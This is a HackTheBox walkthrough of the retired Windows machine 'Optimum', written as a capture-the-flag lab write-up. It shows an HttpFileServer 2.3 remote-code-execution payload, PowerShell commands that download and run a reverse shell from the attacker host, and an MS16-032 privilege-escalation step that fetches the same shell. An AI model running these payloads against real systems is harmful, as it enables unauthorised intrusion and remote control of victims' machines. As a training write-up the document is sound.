---
title: Optimum - HackTheBox Walkthrough
author: Degr4ne
date: 2021-10-21 12:00:00 
categories: [HackTheBox,Windows]
tags: [sherlock,nishang]
math: false
mermaid: false
image:
  src: /assets/img/HTB/Optimum/00-banner.png
  width: 596
  height: 351
---
Hello guys, welcome back with another walkthrough, this time we'll be doing `Optimum` a retired windows machine from HackTheBox rated easy. Without further ado, let’s begin.
# Recon
## Nmap Scan
As always we'll start with a nmap scan to discover the open ports and services.
```console
$ cat nmap-scan                                   
# Nmap 7.91 scan initiated Wed Oct 20 09:58:51 2021 as: nmap -sC -sV -v -oN nmap-scan 10.129.1.127
Nmap scan report for 10.129.1.127
Host is up (0.12s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Oct 20 09:59:11 2021 -- 1 IP address (1 host up) scanned in 20.58 seconds
```
There one port open `80:HTTP`.
## HTTP Enumeration
Let's check it out.

![01-web](/assets/img/HTB/Optimum/01-web.png)

The web site is a `HttpFileServer 2.3` which has a RCE where the attacker can execute commands in a search action.
```text
http://10.129.1.127/?search=%00{.payload.}
```
# Initial Foothold
I used [nishang](https://github.com/samratashok/nishang) to create a reverse shell.

```console
$ cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 rev.ps1
$ echo 'Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.75 -Port 443' >> rev.ps1
```
With a python HTTP server and a netcat listener port I executed the next command using PowerShell in the `sysNative` directory to get a 64-bit shell.
```text
%00{.exec|C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).downloadString('http://10.10.14.75/rev.ps1').}
```

![02-burp](/assets/img/HTB/Optimum/02-burp.png)

# Privilage Escalation
To get the system information from the target machine just run `systeminfo`

![03-sysinfo](/assets/img/HTB/Optimum/03-sysinfo.png)

Clone [Sherlock](https://github.com/rasta-mouse/Sherlock) and add this line `Find-AllVulns` at the end to call that function.

![04-sherlock](/assets/img/HTB/Optimum/04-sherlock.png)

Execute it on the victim machine. 
```text
IEX(New-Object Net.WebClient).downloadString("http://10.10.14.75/Sherlock.ps1")
```
It give us a list with some vulnerabilities of this windows version, the most interesting is `MS16-032`.

![05-sherlock](/assets/img/HTB/Optimum/05-sherlock.png)

With this [exploit](https://github.com/EmpireProject/Empire/blob/master/data/module_source/privesc/Invoke-MS16032.ps1), the only thing we have to do is add this line at the end to run a reverse shell:

```text
Invoke-MS16032 -Command "iex(New-Object Net.WebClient).DownloadString('http://10.10.14.75/rev.ps1')"
```

![06-empire](/assets/img/HTB/Optimum/06-empire.png)

And we get the shell in our listener port 443.

![07-nc](/assets/img/HTB/Optimum/07-nc.png)

We got root.txt  

![08-root](/assets/img/HTB/Optimum/08-root.png)

That’s it for now guys. Until next time.
# Resources
- https://www.thewindowsclub.com/sysnative-folder-in-windows-64-bit
- https://github.com/EmpireProject/Empire
